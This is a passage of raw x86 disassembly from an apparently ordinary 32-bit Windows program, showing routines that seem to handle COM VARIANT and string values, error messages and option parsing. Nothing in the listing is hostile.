  4087a3:	cmp    eax,0xa
  4087a6:	je     0x4087c4
  4087a8:	cmp    eax,0xb
  4087ab:	jne    0x4087b6
  4087ad:	or     eax,0xffffffff
  4087b0:	mov    WORD PTR [esi+0x8],ax
  4087b4:	jmp    0x4087cb
  4087b6:	push   esi
  4087b7:	call   DWORD PTR ds:0x41210c
  4087bd:	test   eax,eax
  4087bf:	js     0x4087d2
  4087c1:	mov    WORD PTR [esi],di
  4087c4:	mov    DWORD PTR [esi+0x8],0x80000001
  4087cb:	pop    edi
  4087cc:	mov    eax,esi
  4087ce:	pop    esi
  4087cf:	ret    0x4
  4087d2:	mov    ecx,eax
  4087d4:	call   0x4090c8
  4087d9:	int3   
  4087da:	int3   
  4087db:	int3   
  4087dc:	int3   
  4087dd:	int3   
  4087de:	int3   
  4087df:	mov    edi,edi
  4087e1:	push   ebp
  4087e2:	mov    ebp,esp
  4087e4:	push   esi
  4087e5:	mov    esi,ecx
  4087e7:	push   esi
  4087e8:	call   DWORD PTR ds:0x41210c
  4087ee:	test   eax,eax
  4087f0:	js     0x408828
  4087f2:	cmp    DWORD PTR [ebp+0x8],0x0
  4087f6:	jne    0x408804
  4087f8:	and    DWORD PTR [esi+0x8],0x0
  4087fc:	push   0x8
  4087fe:	pop    eax
  4087ff:	mov    WORD PTR [esi],ax
  408802:	jmp    0x408821
  408804:	push   DWORD PTR [ebp+0x8]
  408807:	call   DWORD PTR ds:0x412100
  40880d:	test   eax,eax
  40880f:	jne    0x408818
  408811:	mov    ecx,0x8007000e
  408816:	jmp    0x40882a
  408818:	push   0x8
  40881a:	pop    ecx
  40881b:	mov    WORD PTR [esi],cx
  40881e:	mov    DWORD PTR [esi+0x8],eax
  408821:	mov    eax,esi
  408823:	pop    esi
  408824:	pop    ebp
  408825:	ret    0x4
  408828:	mov    ecx,eax
  40882a:	call   0x4090c8
  40882f:	int3   
  408830:	int3   
  408831:	int3   
  408832:	int3   
  408833:	int3   
  408834:	int3   
  408835:	push   0x14
  408837:	mov    eax,0x40f4be
  40883c:	call   0x40ea44
  408841:	mov    esi,ecx
  408843:	push   0x3
  408845:	pop    edi
  408846:	cmp    WORD PTR [esi],di
  408849:	jne    0x408850
  40884b:	mov    eax,DWORD PTR [esi+0x8]
  40884e:	jmp    0x408886
  408850:	lea    eax,[ebp-0x20]
  408853:	push   eax
  408854:	call   DWORD PTR ds:0x412110
  40885a:	and    DWORD PTR [ebp-0x4],0x0
  40885e:	lea    ecx,[ebp-0x20]
  408861:	push   esi
  408862:	push   edi
  408863:	call   0x408891
  408868:	mov    esi,DWORD PTR [ebp-0x18]
  40886b:	or     DWORD PTR [ebp-0x4],0xffffffff
  40886f:	lea    eax,[ebp-0x20]
  408872:	push   eax
  408873:	call   DWORD PTR ds:0x41210c
  408879:	test   eax,eax
  40887b:	jns    0x408884
  40887d:	mov    ecx,eax
  40887f:	call   0x4090c8
  408884:	mov    eax,esi
  408886:	call   0x40ea03
  40888b:	ret    
  40888c:	int3   
  40888d:	int3   
  40888e:	int3   
  40888f:	int3   
  408890:	int3   
  408891:	mov    edi,edi
  408893:	push   ebp
  408894:	mov    ebp,esp
  408896:	mov    eax,DWORD PTR [ebp+0xc]
  408899:	test   eax,eax
  40889b:	jne    0x40889f
  40889d:	mov    eax,ecx
  40889f:	mov    edx,DWORD PTR [ebp+0x8]
  4088a2:	cmp    ecx,eax
  4088a4:	jne    0x4088ab
  4088a6:	cmp    dx,WORD PTR [ecx]
  4088a9:	je     0x4088ba
  4088ab:	push   edx
  4088ac:	push   0x0
  4088ae:	push   eax
  4088af:	push   ecx
  4088b0:	call   DWORD PTR ds:0x4120ec
  4088b6:	test   eax,eax
  4088b8:	js     0x4088be
  4088ba:	pop    ebp
  4088bb:	ret    0x8
  4088be:	mov    ecx,eax
  4088c0:	call   0x4090c8
  4088c5:	int3   
  4088c6:	int3   
  4088c7:	int3   
  4088c8:	int3   
  4088c9:	int3   
  4088ca:	int3   
  4088cb:	push   0x18
  4088cd:	mov    eax,0x40f72b
  4088d2:	call   0x40ea44
  4088d7:	mov    esi,ecx
  4088d9:	mov    edi,DWORD PTR [ebp+0x8]
  4088dc:	and    DWORD PTR [esi],0x0
  4088df:	push   0x8
  4088e1:	pop    ebx
  4088e2:	cmp    WORD PTR [edi],bx
  4088e5:	jne    0x4088f9
  4088e7:	push   DWORD PTR [edi+0x8]
  4088ea:	call   0x408bfc
  4088ef:	mov    eax,esi
  4088f1:	call   0x40ea03
  4088f6:	ret    0x4
  4088f9:	lea    eax,[ebp-0x24]
  4088fc:	push   eax
  4088fd:	call   DWORD PTR ds:0x412110
  408903:	and    DWORD PTR [ebp-0x4],0x0
  408907:	lea    ecx,[ebp-0x24]
  40890a:	push   edi
  40890b:	push   ebx
  40890c:	call   0x408891
  408911:	push   DWORD PTR [ebp-0x1c]
  408914:	mov    ecx,esi
  408916:	call   0x408bfc
  40891b:	or     DWORD PTR [ebp-0x4],0xffffffff
  40891f:	lea    eax,[ebp-0x24]
  408922:	push   eax
  408923:	call   DWORD PTR ds:0x41210c
  408929:	test   eax,eax
  40892b:	jns    0x4088ef
  40892d:	mov    ecx,eax
  40892f:	call   0x4090c8
  408934:	int3   
  408935:	int3   
  408936:	int3   
  408937:	int3   
  408938:	int3   
  408939:	int3   
  40893a:	mov    edi,edi
  40893c:	push   ecx
  40893d:	call   DWORD PTR ds:0x41210c
  408943:	test   eax,eax
  408945:	jns    0x40894e
  408947:	mov    ecx,eax
  408949:	jmp    0x4090c8
  40894e:	ret    
  40894f:	int3   
  408950:	int3   
  408951:	int3   
  408952:	int3   
  408953:	int3   
  408954:	mov    edi,edi
  408956:	push   ebx
  408957:	mov    ebx,ecx
  408959:	push   esi
  40895a:	push   edi
  40895b:	xor    esi,esi
  40895d:	lea    edi,[ebx+0xc]
  408960:	cmp    DWORD PTR [edi],esi
  408962:	jne    0x4089f4
  408968:	push   esi
  408969:	push   esi
  40896a:	push   edi
  40896b:	push   0x400
  408970:	push   DWORD PTR [ebx+0x4]
  408973:	push   esi
  408974:	push   0x1100
  408979:	call   DWORD PTR ds:0x412034
  40897f:	mov    ecx,DWORD PTR [edi]
  408981:	test   ecx,ecx
  408983:	je     0x4089aa
  408985:	cmp    eax,0x1
  408988:	jbe    0x4089f4
  40898a:	cmp    WORD PTR [ecx+eax*2-0x2],0xa
  408990:	jne    0x4089f4
  408992:	xor    edx,edx
  408994:	mov    WORD PTR [ecx+eax*2-0x2],dx
  408999:	mov    ecx,DWORD PTR [edi]
  40899b:	cmp    WORD PTR [ecx+eax*2-0x4],0xd
  4089a1:	jne    0x4089f4
  4089a3:	mov    WORD PTR [ecx+eax*2-0x4],dx
  4089a8:	jmp    0x4089f4
  4089aa:	push   0x40
  4089ac:	push   esi
  4089ad:	call   DWORD PTR ds:0x412030
  4089b3:	mov    ecx,eax
  4089b5:	mov    DWORD PTR [edi],ecx
  4089b7:	test   ecx,ecx
  4089b9:	je     0x4089f4
  4089bb:	mov    edx,DWORD PTR [ebx+0x4]
  4089be:	lea    eax,[edx+0x7ffbfe00]
  4089c4:	cmp    eax,0xfdff
  4089c9:	ja     0x4089d4
  4089cb:	lea    eax,[edx-0x200]
  4089d1:	movzx  esi,ax
  4089d4:	test   si,si
  4089d7:	je     0x4089e4
  4089d9:	movzx  eax,si
  4089dc:	push   eax
  4089dd:	push   0x401a00
  4089e2:	jmp    0x4089ea
  4089e4:	push   edx
  4089e5:	push   0x401a28
  4089ea:	push   ecx
  4089eb:	call   DWORD PTR ds:0x412138
  4089f1:	add    esp,0xc
  4089f4:	mov    eax,DWORD PTR [edi]
  4089f6:	pop    edi
  4089f7:	pop    esi
  4089f8:	pop    ebx
  4089f9:	ret    
  4089fa:	int3   
  4089fb:	int3   
  4089fc:	int3   
  4089fd:	int3   
  4089fe:	int3   
  4089ff:	mov    edi,edi
  408a01:	push   ebp
  408a02:	mov    ebp,esp
  408a04:	push   esi
  408a05:	mov    eax,ecx
  408a07:	push   0x2
  408a09:	pop    ecx
  408a0a:	mul    ecx
  408a0c:	xor    ecx,ecx
  408a0e:	mov    esi,eax
  408a10:	cmp    edx,ecx
  408a12:	ja     0x408a22
  408a14:	jb     0x408a1b
  408a16:	cmp    esi,0xffffffff
  408a19:	ja     0x408a22
  408a1b:	mov    eax,DWORD PTR [ebp+0x8]
  408a1e:	mov    DWORD PTR [eax],esi
  408a20:	jmp    0x408a2d
  408a22:	mov    eax,DWORD PTR [ebp+0x8]
  408a25:	mov    ecx,0x80070216
  408a2a:	or     DWORD PTR [eax],0xffffffff
  408a2d:	mov    eax,ecx
  408a2f:	pop    esi
  408a30:	pop    ebp
  408a31:	ret    0x4
  408a34:	int3   
  408a35:	int3   
  408a36:	int3   
  408a37:	int3   
  408a38:	int3   
  408a39:	push   0x8
  408a3b:	mov    eax,0x40f764
  408a40:	call   0x40ea44
  408a45:	mov    esi,ecx
  408a47:	mov    DWORD PTR [ebp-0x14],esi
  408a4a:	and    DWORD PTR [ebp-0x4],0x0
  408a4e:	and    DWORD PTR [ebp-0x10],0x0
  408a52:	push   0x4018ec
  408a57:	call   0x40594b
  408a5c:	and    DWORD PTR [ebp-0x4],0x0
  408a60:	mov    ecx,esi
  408a62:	push   DWORD PTR [ebp+0x8]
  408a65:	mov    DWORD PTR [ebp-0x10],0x1
  408a6c:	call   0x408b6b
  408a71:	mov    eax,esi
  408a73:	call   0x40ea03
  408a78:	ret    0x4
  408a7b:	int3   
  408a7c:	int3   
  408a7d:	int3   
  408a7e:	int3   
  408a7f:	int3   
  408a80:	mov    eax,DWORD PTR [ecx]
  408a82:	test   eax,eax
  408a84:	je     0x408a94
  408a86:	cmp    DWORD PTR [eax],0x0
  408a89:	je     0x408a94
  408a8b:	push   DWORD PTR [eax]
  408a8d:	call   DWORD PTR ds:0x4120e8
  408a93:	ret    
  408a94:	xor    eax,eax
  408a96:	ret    
  408a97:	int3   
  408a98:	int3   
  408a99:	int3   
  408a9a:	int3   
  408a9b:	int3   
  408a9c:	mov    edi,edi
  408a9e:	push   ebp
  408a9f:	mov    ebp,esp
  408aa1:	push   ecx
  408aa2:	push   ecx
  408aa3:	push   ebx
  408aa4:	push   esi
  408aa5:	push   edi
  408aa6:	mov    edi,ecx
  408aa8:	xor    esi,esi
  408aaa:	mov    ecx,DWORD PTR [ebp+0x8]
  408aad:	mov    DWORD PTR [edi+0x4],esi
  408ab0:	mov    DWORD PTR [edi+0x8],0x1
  408ab7:	call   0x408a80
  408abc:	mov    ecx,DWORD PTR [ebp+0xc]
  408abf:	mov    ebx,eax
  408ac1:	mov    DWORD PTR [ebp-0x4],ebx
  408ac4:	call   0x408a80
  408ac9:	add    ebx,eax
  408acb:	mov    DWORD PTR [ebp-0x8],eax
  408ace:	cmp    ebx,DWORD PTR [ebp-0x4]
  408ad1:	jb     0x408b5b
  408ad7:	push   0x2
  408ad9:	mov    eax,ebx
  408adb:	pop    ecx
  408adc:	mul    ecx
  408ade:	cmp    edx,esi
  408ae0:	ja     0x408b5b
  408ae2:	jb     0x408ae9
  408ae4:	cmp    eax,0xffffffff
  408ae7:	ja     0x408b5b
  408ae9:	push   eax
  408aea:	push   esi
  408aeb:	call   DWORD PTR ds:0x412108
  408af1:	mov    edx,eax
  408af3:	mov    DWORD PTR [edi],edx
  408af5:	test   edx,edx
  408af7:	jne    0x408aff
  408af9:	test   ebx,ebx
  408afb:	je     0x408b50
  408afd:	jmp    0x408b5b
  408aff:	mov    eax,DWORD PTR [ebp+0x8]
  408b02:	mov    ecx,DWORD PTR [eax]
  408b04:	test   ecx,ecx
  408b06:	je     0x408b0c
  408b08:	mov    ecx,DWORD PTR [ecx]
  408b0a:	jmp    0x408b0e
  408b0c:	mov    ecx,esi
  408b0e:	mov    ebx,DWORD PTR [ebp-0x4]
  408b11:	test   ecx,ecx
  408b13:	je     0x408b27
  408b15:	lea    eax,[ebx*2+0x2]
  408b1c:	push   eax
  408b1d:	push   ecx
  408b1e:	push   edx
  408b1f:	call   0x40eb48
  408b24:	add    esp,0xc
  408b27:	mov    eax,DWORD PTR [ebp+0xc]
  408b2a:	mov    eax,DWORD PTR [eax]
  408b2c:	test   eax,eax
  408b2e:	je     0x408b32
  408b30:	mov    esi,DWORD PTR [eax]
  408b32:	test   esi,esi
  408b34:	je     0x408b50
  408b36:	mov    eax,DWORD PTR [ebp-0x8]
  408b39:	lea    eax,[eax*2+0x2]
  408b40:	push   eax
  408b41:	mov    eax,DWORD PTR [edi]
  408b43:	push   esi
  408b44:	lea    eax,[eax+ebx*2]
  408b47:	push   eax
  408b48:	call   0x40eb48
  408b4d:	add    esp,0xc
  408b50:	mov    eax,edi
  408b52:	pop    edi
  408b53:	pop    esi
  408b54:	pop    ebx
  408b55:	mov    esp,ebp
  408b57:	pop    ebp
  408b58:	ret    0x8
  408b5b:	mov    ecx,0x8007000e
  408b60:	call   0x4090c8
  408b65:	int3   
  408b66:	int3   
  408b67:	int3   
  408b68:	int3   
  408b69:	int3   
  408b6a:	int3   
  408b6b:	push   0x4
  408b6d:	mov    eax,0x40f182
  408b72:	call   0x40ea44
  408b77:	mov    esi,ecx
  408b79:	push   0xc
  408b7b:	call   0x40dfa5
  408b80:	pop    ecx
  408b81:	mov    DWORD PTR [ebp-0x10],eax
  408b84:	xor    edi,edi
  408b86:	mov    DWORD PTR [ebp-0x4],edi
  408b89:	test   eax,eax
  408b8b:	je     0x408b9a
  408b8d:	push   DWORD PTR [ebp+0x8]
  408b90:	mov    ecx,eax
  408b92:	push   esi
  408b93:	call   0x408a9c
  408b98:	mov    edi,eax
  408b9a:	or     DWORD PTR [ebp-0x4],0xffffffff
  408b9e:	mov    ecx,esi
  408ba0:	call   0x4058ac
  408ba5:	mov    DWORD PTR [esi],edi
  408ba7:	mov    eax,esi
  408ba9:	call   0x40ea03
  408bae:	ret    0x4
  408bb1:	int3   
  408bb2:	int3   
  408bb3:	int3   
  408bb4:	int3   
  408bb5:	int3   
  408bb6:	push   0x4
  408bb8:	mov    eax,0x40f79d
  408bbd:	call   0x40ea44
  408bc2:	xor    edx,edx
  408bc4:	mov    DWORD PTR [ebp-0x4],edx
  408bc7:	mov    DWORD PTR [ebp-0x10],edx
  408bca:	mov    esi,DWORD PTR [ebp+0x8]
  408bcd:	mov    eax,DWORD PTR [ecx]
  408bcf:	mov    DWORD PTR [esi],eax
  408bd1:	test   eax,eax
  408bd3:	je     0x408bd9
  408bd5:	lock inc DWORD PTR [eax+0x8]
  408bd9:	mov    DWORD PTR [ebp-0x4],edx
  408bdc:	mov    ecx,esi
  408bde:	push   DWORD PTR [ebp+0xc]
  408be1:	mov    DWORD PTR [ebp-0x10],0x1
  408be8:	call   0x408b6b
  408bed:	mov    eax,esi
  408bef:	call   0x40ea03
  408bf4:	ret    0x8
  408bf7:	int3   
  408bf8:	int3   
  408bf9:	int3   
  408bfa:	int3   
  408bfb:	int3   
  408bfc:	push   0x4
  408bfe:	mov    eax,0x40f182
  408c03:	call   0x40ea44
  408c08:	mov    esi,ecx
  408c0a:	call   0x4058ac
  408c0f:	push   0xc
  408c11:	call   0x40dfa5
  408c16:	pop    ecx
  408c17:	mov    ecx,eax
  408c19:	mov    DWORD PTR [ebp-0x10],ecx
  408c1c:	xor    eax,eax
  408c1e:	mov    DWORD PTR [ebp-0x4],eax
  408c21:	test   ecx,ecx
  408c23:	je     0x408c2d
  408c25:	push   DWORD PTR [ebp+0x8]
  408c28:	call   0x40590d
  408c2d:	or     DWORD PTR [ebp-0x4],0xffffffff
  408c31:	mov    DWORD PTR [esi],eax
  408c33:	mov    eax,esi
  408c35:	call   0x40ea03
  408c3a:	ret    0x4
  408c3d:	int3   
  408c3e:	int3   
  408c3f:	int3   
  408c40:	int3   
  408c41:	int3   
  408c42:	push   0x1f4
  408c47:	mov    eax,0x40f7c9
  408c4c:	call   0x40ea7c
  408c51:	mov    edi,ecx
  408c53:	mov    eax,DWORD PTR [ebp+0xc]
  408c56:	lea    ecx,[ebp-0x1f4]
  408c5c:	mov    DWORD PTR [ebp-0x200],eax
  408c62:	call   DWORD PTR ds:0x4121c4
  408c68:	xor    ebx,ebx
  408c6a:	mov    DWORD PTR [ebp-0x4],ebx
  408c6d:	mov    ecx,0x1e0
  408c72:	mov    DWORD PTR [ebp-0x1fc],ebx
  408c78:	lea    eax,[ebp-0x1f0]
  408c7e:	mov    DWORD PTR [ebp-0x1f8],ebx
  408c84:	mov    BYTE PTR [eax],bl
  408c86:	inc    eax
  408c87:	sub    ecx,0x1
  408c8a:	jne    0x408c84
  408c8c:	push   0x8
  408c8e:	mov    edx,0x401a54
  408c93:	lea    ecx,[ebp-0x1f0]
  408c99:	call   0x40a209
  408c9e:	xor    esi,esi
  408ca0:	mov    DWORD PTR [ebp-0x1e0],0x20000
  408caa:	lea    eax,[edi+0x50]
  408cad:	mov    DWORD PTR [ebp-0x1dc],ebx
  408cb3:	inc    esi
  408cb4:	mov    DWORD PTR [ebp-0x1e8],0xa
  408cbe:	push   0x8
  408cc0:	mov    edx,0x401a54
  408cc5:	mov    DWORD PTR [ebp-0x1d8],esi
  408ccb:	lea    ecx,[ebp-0x1a0]
  408cd1:	mov    DWORD PTR [ebp-0x1c4],eax
  408cd7:	mov    DWORD PTR [ebp-0x1d0],0x401a5c
  408ce1:	call   0x40a209
  408ce6:	push   0x8
  408ce8:	mov    edx,0x401a54
  408ced:	mov    DWORD PTR [ebp-0x188],esi
  408cf3:	lea    ecx,[ebp-0x150]
  408cf9:	mov    DWORD PTR [ebp-0x190],0x100c0
  408d03:	mov    DWORD PTR [ebp-0x18c],ebx
  408d09:	mov    DWORD PTR [ebp-0x198],esi
  408d0f:	mov    DWORD PTR [ebp-0x180],0x401a60
  408d19:	call   0x40a209
  408d1e:	push   0x8
  408d20:	mov    edx,0x401a54
  408d25:	mov    DWORD PTR [ebp-0x138],esi
  408d2b:	lea    ecx,[ebp-0x100]
  408d31:	mov    DWORD PTR [ebp-0x140],0x100c0
  408d3b:	mov    DWORD PTR [ebp-0x13c],ebx
  408d41:	mov    DWORD PTR [ebp-0x148],esi
  408d47:	mov    DWORD PTR [ebp-0x130],0x401a64
  408d51:	call   0x40a209
  408d56:	push   0x8
  408d58:	mov    edx,0x401a54
  408d5d:	mov    DWORD PTR [ebp-0xe8],esi
  408d63:	lea    ecx,[ebp-0xb0]
  408d69:	mov    DWORD PTR [ebp-0xf0],0x10010
  408d73:	mov    DWORD PTR [ebp-0xec],ebx
  408d79:	mov    DWORD PTR [ebp-0xf8],esi
  408d7f:	mov    DWORD PTR [ebp-0xe0],0x401a68
  408d89:	call   0x40a209
  408d8e:	push   0x7e
  408d90:	pop    ecx
  408d91:	mov    DWORD PTR [ebp-0x98],esi
  408d97:	mov    DWORD PTR [ebp-0xa0],0x100c2
  408da1:	mov    DWORD PTR [ebp-0x9c],ebx
  408da7:	mov    DWORD PTR [ebp-0xa8],esi
  408dad:	mov    DWORD PTR [ebp-0x90],0x401a6c
  408db7:	call   0x4098dc
  408dbc:	push   0x8
  408dbe:	mov    edx,0x401a54
  408dc3:	mov    DWORD PTR [ebp-0x88],eax
  408dc9:	lea    ecx,[ebp-0x60]
  408dcc:	call   0x40a209
  408dd1:	mov    edx,DWORD PTR [ebp-0x200]
  408dd7:	lea    eax,[ebp-0x1fc]
  408ddd:	push   ecx
  408dde:	mov    DWORD PTR [ebp-0x34],eax
  408de1:	lea    eax,[ebp-0x1f0]
  408de7:	push   eax
  408de8:	push   ecx
  408de9:	push   ecx
  408dea:	mov    ecx,DWORD PTR [ebp+0x8]
  408ded:	mov    DWORD PTR [ebp-0x48],esi
  408df0:	mov    DWORD PTR [ebp-0x50],ebx
  408df3:	mov    DWORD PTR [ebp-0x4c],ebx
  408df6:	mov    DWORD PTR [ebp-0x58],0xa
  408dfd:	mov    DWORD PTR [ebp-0x40],0x401a74
  408e04:	call   0x40cd5d
  408e09:	test   eax,eax
  408e0b:	je     0x408eb0
  408e11:	cmp    DWORD PTR [ebp-0xd4],ebx
  408e17:	jne    0x408e1f
  408e19:	mov    DWORD PTR [ebp-0x1f8],esi
  408e1f:	push   DWORD PTR [ebp-0x174]
  408e25:	mov    ecx,edi
  408e27:	call   DWORD PTR ds:0x4121b0
  408e2d:	push   DWORD PTR [ebp-0x124]
  408e33:	lea    ecx,[edi+0x4]
  408e36:	call   DWORD PTR ds:0x4121b0
  408e3c:	push   DWORD PTR [ebp-0xd4]
  408e42:	lea    ecx,[edi+0x8]
  408e45:	call   DWORD PTR ds:0x4121b0
  408e4b:	push   DWORD PTR [ebp-0x84]
  408e51:	lea    ecx,[ebp-0x1f4]
  408e57:	call   DWORD PTR ds:0x4121b0
  408e5d:	lea    ecx,[ebp-0x174]
  408e63:	call   0x40aa69
  408e68:	lea    ecx,[ebp-0x124]
  408e6e:	call   0x40aa69
  408e73:	lea    ecx,[ebp-0xd4]
  408e79:	call   0x40aa69
  408e7e:	lea    ecx,[ebp-0x84]
  408e84:	call   0x40aa69
  408e89:	cmp    DWORD PTR [edi+0x50],ebx
  408e8c:	je     0x408ed0
  408e8e:	cmp    DWORD PTR [ebp+0x8],0x2
  408e92:	jbe    0x408ed0
  408e94:	push   0x800401e4
  408e99:	call   DWORD PTR ds:0x412014
  408e9f:	mov    ecx,0x1fb
  408ea4:	call   0x4098dc
  408ea9:	mov    ecx,eax
  408eab:	call   0x4094c8
  408eb0:	mov    esi,ebx
  408eb2:	mov    ebx,esi
  408eb4:	mov    esi,ebx
  408eb6:	or     DWORD PTR [ebp-0x4],0xffffffff
  408eba:	lea    ecx,[ebp-0x1f4]
  408ec0:	call   DWORD PTR ds:0x4121c0
  408ec6:	mov    eax,esi
  408ec8:	call   0x40ea1c
  408ecd:	ret    0x8
  408ed0:	cmp    DWORD PTR [edi+0x50],esi
  408ed3:	je     0x408eb2
  408ed5:	cmp    DWORD PTR [ebp-0x184],ebx
  408edb:	jne    0x408ef8
  408edd:	cmp    DWORD PTR [ebp-0x134],ebx
  408ee3:	je     0x408f00
  408ee5:	mov    ecx,0x1f5
  408eea:	call   0x4098dc
  408eef:	mov    ecx,eax
  408ef1:	call   0x4094c8
  408ef6:	jmp    0x408eb4
  408ef8:	cmp    DWORD PTR [ebp-0x134],ebx
  408efe:	jne    0x408f0f
  408f00:	cmp    DWORD PTR [ebp-0xe4],ebx
  408f06:	je     0x408f0f
  408f08:	mov    ecx,0x1f6
  408f0d:	jmp    0x408eea
  408f0f:	push   0x7f
  408f11:	pop    ecx
  408f12:	mov    DWORD PTR [edi+0x54],esi
  408f15:	call   0x4098dc
  408f1a:	push   eax
  408f1b:	push   DWORD PTR [ebp-0x1f4]
  408f21:	call   DWORD PTR ds:0x412238
  408f27:	pop    ecx
  408f28:	pop    ecx
  408f29:	test   eax,eax
  408f2b:	jne    0x408f32
  408f2d:	mov    DWORD PTR [edi+0x54],esi
  408f30:	jmp    0x408f7c
  408f32:	mov    ecx,0x80
  408f37:	call   0x4098dc
  408f3c:	push   eax
  408f3d:	push   DWORD PTR [ebp-0x1f4]
  408f43:	call   DWORD PTR ds:0x412238
  408f49:	pop    ecx
  408f4a:	pop    ecx
  408f4b:	test   eax,eax
  408f4d:	jne    0x408f58
  408f4f:	mov    DWORD PTR [edi+0x54],0x2
  408f56:	jmp    0x408f7c
  408f58:	mov    ecx,0x81
  408f5d:	call   0x4098dc
  408f62:	push   eax
  408f63:	push   DWORD PTR [ebp-0x1f4]
  408f69:	call   DWORD PTR ds:0x412238
  408f6f:	pop    ecx
  408f70:	pop    ecx
  408f71:	test   eax,eax
  408f73:	jne    0x408f7c
  408f75:	mov    DWORD PTR [edi+0x54],0x3
  408f7c:	cmp    DWORD PTR [ebp-0x1fc],esi
  408f82:	jne    0x408f9d
  408f84:	mov    eax,DWORD PTR [edi+0x54]
  408f87:	cmp    eax,esi
  408f89:	jne    0x408f95
  408f8b:	mov    ecx,0x1f9
  408f90:	jmp    0x408eea
  408f95:	or     eax,0x1000
  408f9a:	mov    DWORD PTR [edi+0x54],eax
  408f9d:	cmp    DWORD PTR [ebp-0xe4],ebx
  408fa3:	je     0x408fd9
  408fa5:	push   0x4018f4
  408faa:	lea    ecx,[edi+0x8]
  408fad:	call   DWORD PTR ds:0x4121a8
  408fb3:	test   eax,eax
  408fb5:	je     0x408fd1
  408fb7:	cmp    DWORD PTR [ebp-0x1f8],esi
  408fbd:	jne    0x408eb6
  408fc3:	push   0x4018f4
  408fc8:	lea    ecx,[edi+0x8]
  408fcb:	call   DWORD PTR ds:0x4121b0
  408fd1:	mov    DWORD PTR [edi+0x38],esi
  408fd4:	jmp    0x408eb6
  408fd9:	cmp    DWORD PTR [ebp-0x184],ebx
  408fdf:	jne    0x408fed
  408fe1:	cmp    DWORD PTR [ebp-0x134],ebx
  408fe7:	je     0x408eb6
  408fed:	lea    ecx,[edi+0x8]
  408ff0:	mov    DWORD PTR [edi+0x38],esi
  408ff3:	call   DWORD PTR ds:0x4121a0
  408ff9:	jmp    0x408eb6
  408ffe:	int3   
  408fff:	int3   
  409000:	int3   
  409001:	int3   
  409002:	int3   
  409003:	mov    edi,edi
  409005:	push   ebp
  409006:	mov    ebp,esp
  409008:	push   ecx
  409009:	push   ebx
  40900a:	push   esi
  40900b:	xor    esi,esi
  40900d:	push   edi
  40900e:	mov    edi,ecx
  409010:	mov    eax,esi
  409012:	mov    edx,DWORD PTR [edi+0x34]
  409015:	add    edx,eax
  409017:	and    DWORD PTR [edx+0x204],0xffffefff
  409021:	cmp    esi,0x21
  409024:	jbe    0x409030
  409026:	or     DWORD PTR [edx+0x204],0x1000
  409030:	add    eax,0x294
  409035:	inc    esi
  409036:	cmp    eax,0x5514
  40903b:	jb     0x409012
  40903d:	mov    eax,DWORD PTR [edi+0x54]
  409040:	and    eax,0x3
  409043:	cmp    al,0x3
  409045:	je     0x40905b
  409047:	push   0x1
  409049:	call   0x40e9c1
  40904e:	pop    ecx
  40904f:	mov    edx,0x4018f8
  409054:	mov    ecx,eax
  409056:	call   0x40a377
  40905b:	mov    eax,DWORD PTR [edi+0x54]
  40905e:	mov    ebx,DWORD PTR [edi+0x30]
  409061:	mov    edi,DWORD PTR [edi+0x34]
  409064:	push   0x1
  409066:	mov    DWORD PTR [ebp-0x4],eax
  409069:	call   0x40e9c1
  40906e:	mov    esi,eax
  409070:	pop    ecx
  409071:	test   esi,esi
  409073:	je     0x4090ba
  409075:	test   edi,edi
  409077:	je     0x4090ba
  409079:	mov    eax,DWORD PTR [ebp-0x4]
  40907c:	mov    ecx,eax
  40907e:	and    ecx,0xf
  409081:	sub    ecx,0x1
  409084:	je     0x4090a8
  409086:	sub    ecx,0x1
  409089:	je     0x40909c
  40908b:	sub    ecx,0x1
  40908e:	jne    0x4090b2
  409090:	push   ebx
  409091:	push   eax
  409092:	push   edi
  409093:	mov    ecx,esi
  409095:	call   0x40ddb7
  40909a:	jmp    0x4090b2
  40909c:	push   ebx
  40909d:	push   eax
  40909e:	push   edi
  40909f:	mov    ecx,esi
  4090a1:	call   0x40d602
  4090a6:	jmp    0x4090b2
  4090a8:	push   ebx
  4090a9:	push   ecx
  4090aa:	push   edi
  4090ab:	mov    ecx,esi
  4090ad:	call   0x40dae4
  4090b2:	push   esi
  4090b3:	call   DWORD PTR ds:0x41226c
  4090b9:	pop    ecx
  4090ba:	pop    edi
  4090bb:	pop    esi
  4090bc:	pop    ebx
  4090bd:	mov    esp,ebp
  4090bf:	pop    ebp
  4090c0:	ret    0x8
  4090c3:	int3   
  4090c4:	int3   
  4090c5:	int3   
  4090c6:	int3   
  4090c7:	int3   
  4090c8:	jmp    0x4091e5
  4090cd:	int3   
  4090ce:	int3   
  4090cf:	int3   
  4090d0:	int3   
  4090d1:	int3   
  4090d2:	mov    edi,edi
  4090d4:	push   ebp
  4090d5:	mov    ebp,esp
  4090d7:	mov    eax,DWORD PTR [ebp+0x8]
  4090da:	and    DWORD PTR [ecx+0x8],0x0
  4090de:	and    DWORD PTR [ecx+0xc],0x0
  4090e2:	mov    DWORD PTR [ecx+0x4],eax
  4090e5:	mov    eax,ecx
  4090e7:	mov    DWORD PTR [ecx],0x401074
  4090ed:	pop    ebp
  4090ee:	ret    0xc
  4090f1:	int3   
  4090f2:	int3   
  4090f3:	int3   
  4090f4:	int3   
  4090f5:	int3   
  4090f6:	int3   
  4090f7:	int3   
  4090f8:	int3   
  4090f9:	int3   
  4090fa:	int3   
  4090fb:	int3   
  4090fc:	int3   
  4090fd:	int3   
  4090fe:	int3   
  4090ff:	int3   
  409100:	mov    edi,edi
  409102:	push   ebp
  409103:	mov    ebp,esp
  409105:	push   esi
  409106:	mov    esi,ecx
  409108:	call   0x409190
  40910d:	test   BYTE PTR [ebp+0x8],0x1
  409111:	je     0x40911a
  409113:	push   esi
  409114:	call   0x40df9b
  409119:	pop    ecx
  40911a:	mov    eax,esi
  40911c:	pop    esi
  40911d:	pop    ebp
  40911e:	ret    0x4
  409121:	int3   
  409122:	int3   
  409123:	int3   
  409124:	int3   
  409125:	int3   
  409126:	int3   
  409127:	int3   
  409128:	int3   
  409129:	int3   
  40912a:	int3   
  40912b:	int3   
  40912c:	int3   
  40912d:	int3   
  40912e:	int3   
  40912f:	int3   
  409130:	mov    edi,edi
  409132:	push   ebp
  409133:	mov    ebp,esp
  409135:	push   ecx
  409136:	mov    eax,ds:0x411004
  40913b:	xor    eax,ebp
  40913d:	mov    DWORD PTR [ebp-0x4],eax
  409140:	mov    edx,DWORD PTR [ebp+0x8]
  409143:	push   edi
  409144:	mov    edi,ecx
  409146:	mov    DWORD PTR [edi],0x401074
  40914c:	mov    eax,DWORD PTR [edx+0x4]
  40914f:	mov    DWORD PTR [edi+0x4],eax
